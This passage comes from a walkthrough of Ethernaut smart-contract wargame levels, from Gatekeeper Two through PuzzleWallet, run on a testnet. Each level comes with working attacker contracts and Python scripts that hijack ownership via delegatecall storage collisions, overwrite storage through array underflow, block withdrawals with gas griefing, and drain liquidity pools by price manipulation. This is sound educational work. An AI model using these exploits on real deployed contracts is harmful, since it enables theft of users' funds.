uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
```

is also true. Therefore, _we don't need `_gateKey`_, we can simply pass the result of `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1` as the parameter of `enter()` but casted to `bytes8` as that's what `enter()` calls for.

### How I did it

1. Code an attacker contract where we I define the contract constructor as follows:

```js
constructor(address _instance) public {
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));

    (bool success,) = _instance.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    require(success, "external call failed");
}
```

2. Then simply deploy the contract (at: `0x6961C8C27dC8f153c62815E0EBb0c7bb75d974E1`) and on the constructor run, the `enter()` function is called

```python
gk2attack = GatekeeperTwoAttack.deploy(gatekeeper.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x87105614e9d33bb07ff05662a4c989d5e68dc32e3862c6cccb5c81d1776b8bd6

3. Check that my address is `entrant`

```python
entrant_assertion = gatekeeper.entrant() == acc.address
print(f"Address is entrant: {entrant_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x8c73b0d28f3123100afcacd750d2267bd090faacac152efbb10bd8b6ab39a99a


***

## Naught Coin

### Objectives

Complete this level by getting your token balance to 0.

#### Solution

The ERC20 implementation, which the NaughtCoin contract inherits from, includes functionality for externally owned accounts or contracts to transfer funds out of a specific address given that that address has approved the externally owned account or contract to transfer funds out of it.

This can be done by first calling the function `approve()` from the account holding the NaughtCoins and then `transferFrom()` to transfer the tokens out of the account from the EOA or contract that was approved initially.

In two steps:

1. Call `approve()` as follows:

```js
approve(Account2Address, Account1Balance)
```

2. Call `transferFrom()` as follows:

```js
transferFrom(Account1Address, Account2Address, Account1Balance)
```

Where:

* `Account1Address`: Address of account holding the NaughtCoins
  
* `Account1Balance`: Amount of NaughtCoins in `Account1Address`, can be obtained by calling `balanceOf(Account1Address)`
  
* `Account2Address`: Address of account which will be allowed to move the tokens out of `Account1Address`. 

In this case it's also possible to send the tokens to the burn address `0x0000000000000000000000000000000000000000`.

### How I did it

1. Call `approve()` to allow a second account to move the tokens out of the account holding them. Make sure to approve *at least* the entire balance of tokens in the wallet in order to drain it.

```python
balance_in_wallet = naughtcoin.balanceOf(acc.address)
naughtcoin.approve(acc2.address, balance_in_wallet, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xdd23e9d864d89405610ec5211eca4a6ebc0a9962a7f6a837163f658b53ec97bc

2. Call `transferFrom()` to move the full token balance out of account 1 (`acc`) and into account 2 (`acc2`).

```python
naughtcoin.transferFrom(acc.address, acc2.address, balance_in_wallet, _from2)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xc906a92a4e70cd69b24d33d6b4af67ae061ed86d40f7d26f3fd36bb174bcbbd2

3. Check that the balance is indeed zero

```python
balance_assertion = naughtcoin.balanceOf(acc.address) == 0
print(f"The account balance has been drained: {balance_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xee3cf83fb11b43d97f5667e8c4bb3a242821d527284a15ff4265d565ddee3eab

***

## Preservation

### Objectives

The goal of this level is for you to claim ownership of the instance you are given.

#### Solution

The preservation contract uses the contracts allocated in the addresses `timeZone1Library` and `timeZone2Library` as library contracts. Thus, all calls to these contracts are done through `delegatecall` in the Preservation contract and do NOT touch the storage of each respective `LibraryContract` but rather the storage of the Preservation contract.

When we modify the variable `storedTime` through a `delegatecall` of the `setTime()` function in the library contracts, we are not modifying `storedTime` in neither the library or the Preservation contracts, but rather _the variable occupying the respective storage slot of `storedTime`_ in the Preservation contract.

Therefore, calling either `setFirstTime()` or `setSecondTime()` will modify `timeZone1Library` with whatever value we pass as `_timeStamp`. Therefore, in order to exploit the contract and become `owner`, we need to deploy a contract with the _same storage layout as Preservation_, this means that our attacker contract should define:

```js
address public timeZone1Library;
address public timeZone2Library;
address public owner; 
```

In the exact same order as Preservation.

Also, there must be two additional functions defined in the attacker contract:

* A function `setTime()` that takes a `uint256` parameter, which will, in the case of the attacker contract, modify the variable in its _3rd memory slot_, so `owner`. The name of this variable is not relevant, since we're only interested in modifying the 3rd memory slot in Preservation, but for consistency's purposes, I also named it `owner`.

```js
function setTime(uint256) public {
    owner = tx.origin;
}
```

* A function where `setFirstTime()` is called in Preservation in order to make `timeZone1Library` the attacker contract. If each LibraryContract was _correctly coded_ with an identical layout to Preservation, the Preservation contract wouldn't be vulnerable in this way.

```js
function setFirstTimeExploit() external {
    preservationContract.setFirstTime(uint256(address(this)));
}
```

Where `preservationContract` is an interface to the Preservation contract.

Therefore the flow is as follows:

1. Make `timeZone1Library` the attacker contract address by calling `setFirstTime()` from the attacker contract.

2. Call `setFirstTime()` in the Preservation contract with any unsigned integer as parameter, which executes `setTime()` in the attacker contract making `owner` our origin address.

### How I did it

1. Code and deploy (at: `0x5E51EE439b501d7e39261Df8C437dA19a28F651D`) the attacker contract as described in [solution](#solution-14)

```python
pattack = PreservationAttack.deploy(preservation.address, _from)
```

2. Call `setFirstTime()` from the attacker contract

```python
pattack.setFirstTimeExploit(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xecb25cbd88e8581ed18dcff2dde1de2eae3e4b52632aa6f6caeafda07f38d943

3. Call `setFirstTime()` from the address I want to make `owner` (my address, in this case, `tx.origin`), though I could have also manually hardcoded the address in the attacker contract.

```python
preservation.setFirstTime(0, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x100300c698f668e8c3d50a439cfd57cfe7f363b7fee1986babaff39aaa2a790a

4. Check that my address is owner

```python
owner_assertion = preservation.owner() == acc.address
print(f"My address is the contract owner {owner_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x103ddeb1d690d372de65f1ceef96628dd0ea60776cc5cc4ddb5adea323dc4cc3

***

## Recovery

### Objectives

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

#### Solution

As specified in section 7 of the Ethereum yellowpaper, contract addresses are deterministic and can be derived from the deployer address of the contract and the nonce of the deployment transaction coming from deployer.

In this case we have that information from the get-go:

1. The contract deployer address (our instance, in my case `0xc03f501C5987CAaC9e4470849f13eEA338b76E9f`)

2. The nonce of the deployment of the first SimpleToken (1 as stated on the exercise)

Therefore, we can compute the contract address of the first SimpleToken deployment easily, which results in `0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db`. 

Technically, it is easy to cheat here, since the contract address of the contract we want to drain is easy to see on a block explorer by inspecting the internal transactions of the instance contract. However, the objective of the exercise is to derive the address ourselves.

With this information, all we have to do now is call the `destroy()` function in the SimpleToken contract and direct the funds within it to any address in order to mark the exercise as completed.

### How I did it

1. Once we have these two details (deployer address, nonce) as I described in [solution](#solution-15), we can code a function in python (or directly in solidity) to obtain the address. As a resourceful developer, even though I know how to compute this, I still decided to go and find a ready made solution in StackExchange in order to skip this:

```python
# compute address of a given contract to be deployed from
# the deployer address + nonce, as stated in the Section 7 
# of the Ethereum yellowpaper for contracts created using CREATE
def mk_contract_address(sender: str, nonce: int) -> str:
    """Create a contract address using eth-utils.
    # Modified from Mikko Ohtamaa's original answer which was later
    # edited by Utgarda
    # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
    """
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)
```

I would change a few things but if it ain't broke, don't fix it.

2. Then, we can plug in these values and find the address of that first ever SimpleToken deployment:

```python
first_simpletoken_contract_address = mk_contract_address(recovery.address, 1)
```

3. Connect to this contract and call the `destroy()` function, sending the funds to my address.

```python
simpletoken.destroy(acc.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x8f6213e0626f9f592ef4be898c9bbbe08e1782425ab844602925c57359af7fa1

1. Check that we have actually drained the contract address.

```python
balance_assertion = simpletoken.balance() == 0
print(f"The balance of SimpleToken is zero: {balance_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x81b43555a6325d320d659ccf655e73431e3c70dd531c0db40dd34311bcd46553
***

## Magic Number

### Objectives

To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.

#### Solution

There's several ways to approach this problem, but in a nutshell, all that's needed is a contract that can return the number 42 by using _at most_ 10 opcodes in its _runtime_ code.

I find that [this article](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) details the solution much better than I could. But as a way to document my understanding of this problem and its solution, I'll try to write in a few steps what has to be done to successfully solve it:

1. We must code a contract using either raw bytecode or Yul (as I did in [my solution](#how-i-did-it)):

```
33600055600a6011600039600a6000f3fe602a60005260206000f3
```

Which is the raw bytecode representing the following opcodes:

```
CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN 
```

These raw assembly opcodes can be divided into two parts:

* Initialization code (can be of any length)

```
CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID
```

* Runtime code (has to have a length of _at most_ 10 opcodes)

```
PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN 
```

Here's the bytecode as returned by the Remix IDE after compiling the Yul contract I coded to solve this:

```json
{
	"functionDebugData": {},
	"generatedSources": [],
	"linkReferences": {},
	"object": "33600055600a6011600039600a6000f3fe602a60005260206000f3",
	"opcodes": "CALLER PUSH1 0x0 SSTORE PUSH1 0xA PUSH1 0x11 PUSH1 0x0 CODECOPY PUSH1 0xA PUSH1 0x0 RETURN INVALID PUSH1 0x2A PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 RETURN ",
	"sourceMap": "90:8:0:-:0;87:1;80:19;143;120:21;117:1;108:55;182:19;179:1;172:30"
}
```

2. Deploy the contract to the blockchain, which we can do in several different possible ways:

* Writing the contract in Yul and using the Yul compiler on the Remix IDE and then deploying the blockchain using injected Web3 or any other method.

* Creating a contract that itself deploys a contract on the blockchain using raw bytecode and calling either `create()` or `create2()` in an `assembly{}` block on the contract.

* Sending a raw transaction with the bytecode as data, which the EVM will interpret as a contract creation from the set of initialization opcodes.

There are probably more ways, but I'm not familiar with them.

1. Set the solver calling `setSolver()` in the MagicNum contract.

### How I did it

1. I first needed to look for help as I had absolutely no idea how to approach this problem, but after extensive reading of how this whole thing works and some basics of opcodes and EVM assembly, I then decided to code a contract using Yul (deployed at: `0x678a4e09ec08d8fd32abc0f4e3e28469fe8b6e80`), which IMO is a very readable way of attempting to do this.

The contract looks like this (It's under `/contracts/attacks/MagicNumberSolver.Yul` in the repo):

```js
// SPDX-License-Identifier: MIT
object "MagicNumberSolver" {
    code {
        sstore(0, caller())
        datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
        return(0, datasize("Runtime"))
    }
    object "Runtime" {
        code {
            mstore(0x0, 0x2a)
            return(0x0, 0x20)    
        }
    }
}
```

This is a _million times_ more readable than raw bytecode or even raw opcodes, though now raw opcodes no longer look like robot instructions to me (even though they technically are). 

This is the constructor of the contract (initialization opcodes), usually declared with `constructor()` in Solidity:

```js
code {
    sstore(0, caller())
    datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
    return(0, datasize("Runtime"))
}
```

This code basically stores the `caller()` in slot 0 and copies the contract code ("Runtime") to it (`datacopy()`) and specifying the size of the contract code (`datasize()`) and the offset (`dataoffset()`). The name of the object containing the code (in my case "Runtime") can be anything, it simply serves as a way to refer to it through functions like `datasize()`, which take a string of the name of a Yul object. The return opcode concludes the runtime of the constructor.

And this is the code of the contract itself after deployment (runtime opcodes), what is stored on the blockchain:

```
object "Runtime" {
    code {
        mstore(0x0, 0x2a)
        return(0x0, 0x20)    
    }
}
```

This object also has code, and this code is also extremely short, but does what we are asked for in the exercise as requested, which is first allocate memory (`mstore`) on slot `0x0` with the value `0x2a` which is the number 42 in hexadecimal. Then it takes that value in slot `0x0` and `return`s it as `0x20` which is 32 bytes.

Subsequently, I compiled and deployed the contract using the Remix IDE, which has a Yul compiler marked as experimental at the time of solving this challenge.

2. Call the `setSolver()` function to set the solver to the address of the deployed contract

```python 
magicnumber.setSolver('0x678a4e09ec08d8fd32abc0f4e3e28469fe8b6e80', _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x39dd993c53234338ad6928550cfc73040081da7007c11ae15c5a05fbbd3e116f

3. The only way to confirm this works is to either make a set up of the Ethernaut challenges locally, or just attempt to submit on the Ethernaut site, and I decided to just submit, since it can be attempted again anyway even if it's wrong. In my case, I made a few attempts tweaking different values until I got it right, my biggest error was that in the "Runtime" object I was writing numbers in decimal instead of hexadecimal.

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xc46148d557083fb12b8768884f70091d3099f535ae20281edc8a6f8018a7c5f5
***

## Alien Codex

### Objectives

Claim ownership to complete the level.

#### Solution

In the AlienCodex contract we can leverage the `retract()` function to cause an integer underflow in the length of the `codex` array. This underflow allows us to modify any state variable in the contract through the `revise()` function. The exploit can be performed as follows:

1. Call the `make_contact()` function to pass the `contacted()` modifier check, requiring `contact` to be true.

2. Call the `retract()` function to cause an integer overflow in the `codex` array length

3. Find the hash of the `owner` state variable as if it were part of the `codex` array by:

* Obtaining the hash of the first item in the `codex` array (as it is indexed in the contract storage), corresponding to its slot in the contract storage. This can be obtained by computing the Keccak256 hash of first _position_, so: `keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)`. 

* Taking the hash resulting from this (`0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`) and subtracting its integer value from the maximum amount of slots in a contract plus one ($2^{256} - 1$), so roughly:

$$2^{256} - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)$$

In Python (for example):

```python
2**256 -  int(web3.sha3(hexstr=f'0x{"0"*63}1').hex(),16)
```

Which returns the hash: `0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a`

4. Using this resulting value in `revise()` as the `i` (index) of the array `codex` to modify and `_content` as our address.


### How I did it

_Exactly_ as described in [solution](#solu), but using my local setup in brownie:

1. Call `make_contact()`

```python
aliencodex.make_contact(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x74e8128a14d8864febad45c3af8eeb42f8da329fb5a991a6ce863343ed31a581

2. Call `retract()` 

```python
aliencodex.retract(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x2affc0a88a1ec555330db5735d68e7819159a18aa905d5fb93698aa9eaa05dd1

3. Obtain the `codex` hash with the position of the `_owner` state variable in storage

```python
position_one = encode_abi(['uint256'],[1]).hex()
owner_hash = hex(2**256 - int(web3.sha3(hexstr=f"0x{position_one}").hex(),16))
```

4. Call `revise()` passing in my address and the hash

```python
aliencodex.revise(owner_hash, acc.address, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x12237e71e4fe8c6dcb94a3b3dea913d30fc8c99cc96faa890bb5bb3e1bdcb7da

5. Confirm that my address is indeed the new owner

```python
owner_assertion = aliencodex.owner() == acc.address
print(f"Address {acc.address} is the owner of the contract: {owner_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x5aeb0a8299d1b6000a56b6952b15f88f9571781402a839b483cab48f37749998

***

## Denial

### Objectives

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

#### Solution

The message call in the Denial contract does not specify an amount of gas, so we can define a `receive()` fallback function in our attacker contract that will be so expensive that unless the `partner` address is changed, it will not be possible to call the `withdraw()` function.

1. Code and deploy an attacker contract. The attacker should have a `receive()` fallback function that runs some set of instructions that are extremely expensive.

2. Make the attacker contract `partner` through the `setWithdrawPartner()` function.

If a specific amount to spend had been set, execution would not halt and the `transfer()` function in line 24 would have executed without issues.

### How I did it

1. I coded and deployed (at: `0x5708A3c4d9472B9D6951200c6d6C2FB82ef96c50`) an attacker contract with a `receive()` fallback function defined as follows:

```js
receive() external payable {
    while (true) {
        foreverLooping += 1;
        if (foreverLooping > 0) {foreverLooping = 0;}
    }
}
```

Where `foreverLooping` is a state variable:

```js
uint256 private foreverLooping;
```

In python:

```python
denialattack = DenialAttack.deploy(denial.address, _from)
```


2. I made the contract `partner` through a function inside the contract I defined which calls `setWithdrawPartner()` in Denial through an interface:

```js
function setThisAsWithdrawPartner() public {
    denialContract.setWithdrawPartner(address(this));
}
```

Where `denialContract` is the interface object.

In python:

```python
denialattack.setThisAsWithdrawPartner(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xdee6f9ca64398992a8f98aecdbaab5ffa3e411ae9b104b4e06b677fb4aa1731c

3. I tested calling the `withdraw()` function myself within a try-except block, since I usually get an `RPCRequestError` when trying to access the `revert_msg` attribute of a reverted transaction. However, if I did get the `revert_msg` anyway, this would also still work:

```python
# test withdraw() to see if the tx fails
try:
    tx = denial.withdraw(_from | {'allow_revert':True})
    # fail tx assertion
    fail_tx_assertion = False

except:
    # fail tx assertion
    fail_tx_assertion = True

print(f"The transaction failed/reverted: {fail_tx_assertion}")
```

With this call, I determine through the assertion if the action of the challenge instance will work or not.

Block explorer: https://rinkeby.etherscan.io/tx/0xdc37b616c23234b2f87eaeda94715482580a129c6ce2bad5f28a77aefd5b79c7 (reverted tx)

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x778e0059d279b716c24808fd4ecc2ea79ca6b7396ee05da2e7ed35ea6ca3733b

***

## Shop

### Objectives

Сan you get the item from the shop for less than the price asked?

#### Solution

It is possible to return different values based on the state variable `isSold`. After the check passes where `_buyer.price() >= price && !isSold` returns true, we can internally change our contract so that the value that `price()` returns changes based on `isSold`.

All we have to do is make sure the function `price()` returns 100 when `isSold` is false and a value under 100 when `isSold` is false.

### How I did it

1. Code and deploy a Buyer contract (at: `0xB9dcacbc393D15fEa292705d66c1549035CcB3ee`) where I define the `price()` function as follows:

```js
function price() public view returns (uint256) {
    if (shopContract.isSold()) {
        return 1;
    } else {
        return 100;
    }
}
```

If `isSold` is true, the price gets overwritten by a 1, however, in the if statement, we pass the check (requiring `price()` to return 100) since `isSold` is still false.

In python:

```python
buyer = Buyer.deploy(shop.address, _from)
```

2. Call the buy function in the Shop contract, which the Shop contract expects to see coming from another contract (in this case my Buyer contract).

```python
buyer.shop(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x2bcb495224d8fbf2ab49a0750336ff0ec2b9cb07e824022381655e51e589335b

3. Confirm that the price < 100

```python
price_assertion = shop.price() < 100
print(f"The selling price is below 100: {price_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xae682a54188a7c3de2a542e0a5699bc39a908dff1c14e8cfaa9039e593413331

***

## Dex

### Objectives

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

#### Solution

First we have to approve both tokens for transfer, which we can conveniently do with the `approve()` function in the Dex contract. Then we take advantage of the poor way to compute the price used by the contract. 

The ratio used to compute the price of each asset is as follows:

$$getSwapPrice(T_n, T_k, A) = A * \frac{balanceOf(T_n, Dex)}{balanceOf(T_k, Dex)}$$

Where:

* $getSwapPrice(T_n, T_k, A)$ is the function to compute the price of the asset
* $A$ is the amount of the token to be traded
* $T$ is the contract address of a given token, subindexes $n$, $k$ represent integers referring to the name of the tokens, in this case we have Token 1 and Token 2, though the `getSwapPrice` function can be called 
* $Dex$ is the address of the Dex contract

This ratio computation is severely flawed and can very easily be used to attack the contract. We can see that by simply using the 10 tokens we're given to perform swaps, the ratio becomes completely unbalanced, as we are simply relying on the available supply on the assets stored in the contract.

***

To illustrate the imbalance each swap creates, let's simulate the first 3 scenarios:

#### First swap

With:

* $A_{T_1} = 10$
* $balanceOf(T_1, Dex) = 100$
* $balanceOf(T_2, Dex) = 100$:

Then:

$$T_1 \rightarrow T_2 \approx 10$$

After each swap, the balances will change, as we are putting units of $T_1$ in the pool and taking out units of $T_2$ and vice versa.

#### Second swap

With:

* $A_{T_2} = 10$
* $balanceOf(T_1, Dex) = 110$
* $balanceOf(T_2, Dex) = 90$:

Then:

$$T_2 \rightarrow T_1 \approx 12$$

Here we already see that by putting back the same 10 $T_2$ tokens we put in, we can now take out 12 $T_1$ tokens. This is because the internal price in the pool is now unbalanced. 

#### Third swap

With 

* $A_{T_1} = 12$
* $balanceOf(T_1, Dex) = 98$
* $balanceOf(T_2, Dex) = 100$:

Then:

$$T_2 \rightarrow T_1 \approx 12$$

This last swap illustrates that of the total pool balance, we have effectively 'stolen' 2% of the $T_1$ balance. Executing the swap several additional times, creates enough asset imbalance so that there's no longer any assets in one side of the pool. If we continue though, we would drain both liquidity sides.

#### Balances at each swap

| Swap | Balance $T_1$ | Balance $T_2$ | Floor of $getSwapPrice(T_n, T_k, 10)$ |
|------|---------------|---------------|---------------------------------------|
| 0    | 100           | 100           | 10                                    |
| 1    | 110           | 90            | 12                                    |
| 2    | 98            | 100           | 10                                    |
| 3    | 110           | 88            | 12                                    |
| 4    | 83            | 110           | 13                                    |
| 5    | 110           | 75            | 14                                    |
| 6    | 59            | 110           | 18                                    |
| 7    | 110           | 15            | 7                                     |
| 8    | 0             | 30            | Inf                                   |

Even though I used the floor of the price, solidity will still apparently internally use decimals prior to casting to integer. As a result of this, swap 8 will cause the pool to be drained, as $7.\bar{3} * 15 = 110$.

### How I did it

1. First call the `approve()` function in the Dex contract:

```python
# use the convenient approve method in dex
dex.approve(dex.address, 2*256 - 1, _from)
```

0x3a7d2248b69cd0cc34fa41e32c8b27ee9d20c9c59129d7c68c5530b29e70845f

2. Then I perform enough swaps until the pool is drained, which I do inside an infinite while loop that breaks when the condition that at least one of the balances of a token in the Dex is drained. The following if-else statement performs each swap, all the swaps except the last one using as the amount my balance of each token per swap (alternates through the boolean `c` which is used to index this dictionary `switch = {True: {1: tk1, 2: tk2}, False: {1: tk2, 2: tk1}}`):

```python
# perform action
if (my_bal < dex_bal1(c)):
    dex.swap(switch[c][1], switch[c][2], my_bal, _from)
else:
    dex.swap(switch[c][1], switch[c][2], dex_bal1(c), _from)

# check if we are done
if dex_bal1(c) == 0 or dex_bal2(c) == 0:
    break
```

Table with the swaps and tx hashes:

| Swap | Balance $T_1$ | Balance $T_2$ | Tx hash of each one of the swaps                                   |
|------|---------------|---------------|--------------------------------------------------------------------|
| 0    | 100           | 100           | [0xded5a80cd702d0f330f0acdda86248b0622a9c05d59a3fb7d7ef8abd1e2fdc12](https://rinkeby.etherscan.io/tx/0xded5a80cd702d0f330f0acdda86248b0622a9c05d59a3fb7d7ef8abd1e2fdc12) |
| 1    | 110           | 90            | [0xa1b979e946ea9e75ec484309773d11f9c1dba0e5a7894a421a3fdfb3401a2428](https://rinkeby.etherscan.io/tx/0xa1b979e946ea9e75ec484309773d11f9c1dba0e5a7894a421a3fdfb3401a2428) |
| 2    | 98            | 100           | [0xdfccc83437533c5a142583426a858f7cdf1bee830548523222f353c86775a31e](https://rinkeby.etherscan.io/tx/0xdfccc83437533c5a142583426a858f7cdf1bee830548523222f353c86775a31e) |
| 3    | 110           | 88            | [0x60703c7c78c142f8ad9e9279b7a4a1478d5d48715220d8775f9dfebe5343b7e1](https://rinkeby.etherscan.io/tx/0x60703c7c78c142f8ad9e9279b7a4a1478d5d48715220d8775f9dfebe5343b7e1) |
| 4    | 83            | 110           | [0xe08e68d42b49de0aecef4df9a94e6fd3ad93389155735a896f347e20e84593df](https://rinkeby.etherscan.io/tx/0xe08e68d42b49de0aecef4df9a94e6fd3ad93389155735a896f347e20e84593df) |
| 5    | 110           | 75            | [0x5be83195ec1369e34cc05c7b097e15611ef9e8a8d4a00f8a3e97f829e7ff148c](https://rinkeby.etherscan.io/tx/0x5be83195ec1369e34cc05c7b097e15611ef9e8a8d4a00f8a3e97f829e7ff148c) |
| 6    | 59            | 110           | [0x44b5e1ff748c05acdf87128d7b68af188cb76e47a226744568c246e36b352773](https://rinkeby.etherscan.io/tx/0x44b5e1ff748c05acdf87128d7b68af188cb76e47a226744568c246e36b352773) |
| 7    | 110           | 15            | [0xaf0676991ff5583ac68e13197df00b7e0bfa1796f7769519721c8bff8e72ced8](https://rinkeby.etherscan.io/tx/0xaf0676991ff5583ac68e13197df00b7e0bfa1796f7769519721c8bff8e72ced8) |
| 8    | 0             | 30            | Pool is drained at this point                                      |


3. Once the loop breaks, I confirm that I have actually drained at least one side of the pool:

```python
# check that we have effectively drained at least one of the tokens
balance_assertion = (dex_bal1(True) == 0) or (dex_bal2(True) == 0)
print(f"Token1 balance: {dex_bal1(True)}")
print(f"Token2 balance: {dex_bal2(True)}")
print(f"at least one side is drained: {balance_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xb05ba7ef00bcc01183a48d47c3bc8e67d81eeafcc02309676ad00ded8abfd69f

***

## Dex Two

### Objectives

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

#### Solution

The DexTwo problem suffers from a different problem to the Dex problem. In this case, there is no require statement checking whether the two token contract addresses being swapped actually match the two token contract addresses for which the pool is designed. As correctly defined in the Dex contract, this line is missing:

```js
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

As a result of this, we can code another ERC20 token contract of which we mint the entire supply to our wallet and with just a few of these we can drain both sides of the pool as follows:

1. Create a new ERC20 token and mint the entire supply to our wallet. As defined in the SwappableTokenTwo contract or otherwise.

2. Send a few of those tokens to the DexTwo contract.

3. Approve the DexTwo contract for spending our new token.

4. Transfer some of the new tokens to the contract, so that the contract can compute the internal ratio in it of the tokens using the same flawed `getSwapAmount()` function.

5. Perform 2 swaps, one to drain the balance of Token 1 and another one to drain the balance of Token 2 by swapping of our Token 3 (the new token) for them.

6. Because we can control the internal ratio and we can perform swaps with zero checks of whether the address is the correct one or not, the pool can be easily drained.

### How I did it

Exactly as described in [solution](#solution-21).

1. Code and deploy a new ERC20 token (at: `0xc27a45c6D84F6AB7aAFECFB82d0853064e288261`)

```python
dextwoattack = DexTwoAttack.deploy('token3', 'TK3', '10000000000000', _from)
```

2. Approve the DexTwo contract spending limit for our new token

```python
dextwoattack.approve(dextwo.address, 2**256 - 1, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x8a25d4bcb33d461f536192aecc1a3137ba17293341ce2235c958c5b3d675e1bf

3. Transfer some of the new tokens to the DexTwo contract

```python
dextwoattack.transfer(dextwo.address, 10, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xd2a9c745602a8b5f87117939d22133e877657ff030e6eeb0258260bdd47a072c

4. Perform both swaps, one to drain the balance of Token 1 and the other one to drain the balance of Token 2

Block explorer: https://rinkeby.etherscan.io/tx/0x9a8a5397aed89c3fb0570c293f3465af37ebc658c5a1e241891774e749bb083c

Block explorer: https://rinkeby.etherscan.io/tx/0x8f1434586d9cbfb6774c8be95c3e8a2b538c3c09ee0a3b6978daff585898bded

5. Check whether we have successfully drained the pools or not

```python
# check the balances
balanceTK1 = dextwo.balanceOf(tk1, dextwo.address)
balanceTK2 = dextwo.balanceOf(tk2, dextwo.address)
print(f"The pool balances are: TK1: {balanceTK1}, TK2: {balanceTK2}")

# the pools have been drained
balance_assertion = balanceTK1 == 0 and balanceTK2 == 0
print(f"The pools have been drained: {balance_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x2ad048ca0de3d4f6c1bdd78862d202dad7a7d68bd9ed87fc0ea98a511efd205c

***

## PuzzleWallet

### Objectives

You'll need to hijack this wallet to become the admin of the proxy.

#### Solution

The state variable layout of the PuzzleProxy contract and the PuzzleWallet contract is as follows:

| Storage slot | PuzzleProxy  | PuzzleWallet |
| ------------ | ------------ | ------------ |
| 0            | pendingAdmin | owner        |
| 1            | admin        | maxBalance   |

But as we know from the utility of proxies, the objective of proxies is to contain storage to allow contract implementations (logic contract) to be upgraded without having to replace contract storage in every upgrade. There's a problem with this storage layout, as there's state variables that some functions in PuzzleWallet modify like `setMaxBalance()`, the variables that PuzzleWallet will end up modifying through delegatecalls are the variables in PuzzleProxy.

If the developers intended PuzzleWallet variables like `owner` and `maxBalance` to have their own slot, they should have replicated the same storage layout in PuzzleProxy first and then add any additional variables in order to avoid storage collisions.

Therefore, we can follow these steps to become `admin`:

1. Call `proposeNewAdmin()` on PuzzleProxy passing your address as `_newAdmin` in order to become `owner`, as `owner` is also `pendingAdmin` because of the storage collision

**All subsequent steps past this point must be done through he proxy contract's fallback function which passes all calls to the PuzzleWallet contract using `delegatecall`. To do this, just perform a normal transaction with some encoded data pertaining to the function calls and inputs.**

2. Become whitelisted by calling `addToWhitelist()` passing your address as `addr` in order to pass the `onlyWhitelisted` modifier check.  

3. Create a transaction data bundle in order to call `multicall()`. The bundle should consist of two deposit transactions. However, the code doesn't allow for this, instead, the bundle should consist of a multicall bundle with the tx data for a `deposit()` call and a `multicall()` containing a `deposit()` call. Because the transaction is nested, this second `multicall()` that calls `deposit()` will not detect that we are calling deposit twice in a row.

4. Because we called `deposit()` twice but our tx value in that single tx was 0.001 ether, even though you only deposit 0.001 ether once, it still sums 0.001 ether twice to your address' balance in the `balance` mapping.

5. Now that your balance in the `balance` mapping is of 0.002 ether, you're able to withdraw the entire contract balance. To do so, call `execute()` with the entire contract balance in the `value` parameter of the function.

